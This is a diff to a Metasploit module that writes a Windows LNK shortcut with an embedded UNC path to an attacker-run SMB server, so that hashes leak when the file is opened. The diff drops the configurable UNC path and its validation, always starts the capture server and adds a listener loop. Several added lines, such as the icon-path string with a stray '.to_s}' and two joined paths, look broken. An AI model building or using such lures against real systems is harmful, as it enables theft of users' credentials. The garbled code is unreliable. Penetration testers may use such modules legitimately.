@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'faker'
+
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::FILEFORMAT
@@ -39,15 +41,14 @@ class MetasploitModule < Msf::Auxiliary
         'DisclosureDate' => '2025-05-16',
         'Notes' => {
           'Stability' => [CRASH_SAFE],
-          'SideEffects' => [IOC_IN_LOGS],
-          'Reliability' => [REPEATABLE_SESSION]
+          'SideEffects' => [ARTIFACTS_ON_DISK],
+          'Reliability' => []
         }
       )
     )
 
     register_options([
-      OptString.new('FILENAME', [true, 'The LNK file name', 'msf.lnk']),
-      OptString.new('UNC_PATH', [false, 'The UNC path for credentials capture (e.g., \\192.168.1.1\share)', nil]),
+
       OptString.new('DESCRIPTION', [false, 'The shortcut description', nil]),
       OptString.new('ICON_PATH', [false, 'The icon path to use (not necessary using real ICON)', nil]),
       OptInt.new('PADDING_SIZE', [false, 'Size of padding in command arguments', 10])
@@ -55,41 +56,31 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    print_status("Creating '#{datastore['FILENAME']}' file...")
-
     description = datastore['DESCRIPTION']
     icon_path = datastore['ICON_PATH']
 
-    unless description && !description.empty?
-      require 'faker'
-      description = Faker::Lorem.sentence(word_count: 3)
-      description ||= 'Shortcut'
-    end
+    description = "#{Faker::Lorem.sentence(word_count: 3)}Shortcut" if description.blank?
 
-    unless icon_path && !icon_path.empty?
-      require 'faker'
-      icon_path = File.join('%SystemRoot%\System32', "#{Faker::File.file_name(ext: 'ico')}.to_s")
-      icon_path ||= '%SystemRoot%\System32\shell32.dll'
-    end
+    icon_path = "%SystemRoot%\\System32\\#{Faker::File.file_name(ext: 'ico')}.to_s}%SystemRoot%\System32\shell32.dll" if icon_path.blank?
 
-    unc_path = datastore['UNC_PATH']
-    if unc_path.blank?
-      start_smb_capture_server
-      unc_path = "\\#{srvhost}\#{Rex::Text.rand_text_alphanumeric(6)}"
-    else
-      validate_or_fail_unc!(unc_path)
-    end
+    start_smb_capture_server
 
-    @resolved_description = description
-    @resolved_icon_path = icon_path
-    @resovled_unc_path = unc_path
-    lnk_data = create_lnk_file
-    file_create(lnk_data)
-    print_good("LNK file created: #{datastore['FILENAME']}")
-    print_status("Listening for hashes on #{srvhost}:#{srvport}")
+    unc_path = "\\\\#{srvhost}\\\\#{Rex::Text.rand_text_alphanumeric(6)}"
+    lnk_data = create_lnk_file(description, icon_path, unc_path)
+    filename = file_create(lnk_data)
+    print_good("LNK file created: #{filename}")
+    print_status("Listening for hashes on #{srvhost}")
+
+    stime = Time.now.to_f
+    timeout = datastore['ListenerTimeout'].to_i
+    loop do
+      break if timeout > 0 && (stime + timeout < Time.now.to_f)
+
+      Rex::ThreadSafe.sleep(1)
+    end
   end
 
-  def create_lnk_file
+  def create_lnk_file(description, icon_path, unc_path)
     data = ''.b
 
     # LNK header - 76 bytes
@@ -133,7 +124,6 @@ class MetasploitModule < Msf::Auxiliary
     data += header
 
     # NAME field (description in Unicode)
-    description = @resolved_description.to_s
     description_utf16 = description.encode('UTF-16LE').b
     data += [description_utf16.bytesize / 2].pack('v')
     data += description_utf16
@@ -146,7 +136,6 @@ class MetasploitModule < Msf::Auxiliary
     data += cmd_args_utf16
 
     # ICON LOCATION field (icon path in Unicode)
-    icon_path = @resolved_icon_path.to_s
     icon_path_utf16 = icon_path.encode('UTF-16LE').b
     data += [icon_path_utf16.bytesize / 2].pack('v')
     data += icon_path_utf16
@@ -157,9 +146,6 @@ class MetasploitModule < Msf::Auxiliary
 
     data += [env_block_size].pack('V')
     data += [env_block_sig].pack('V')
-
-    # Target field in ANSI (260 bytes)
-    unc_path = @resovled_unc_path.to_s
 
     # Create fixed-size ANSI buffer with nulls
     ansi_buffer = "\x00".b * 260
@@ -193,9 +179,4 @@ class MetasploitModule < Msf::Auxiliary
     start_service
   end
 
-  def validate_or_fail_unc!(path)
-    unless path.match(/^\\\\[^\\]+\\[^\\]*$/)
-      fail_with(Failure::BadConfig, 'UNC_PATH format invalid, expected \\server\share')
-    end
-  end
 end
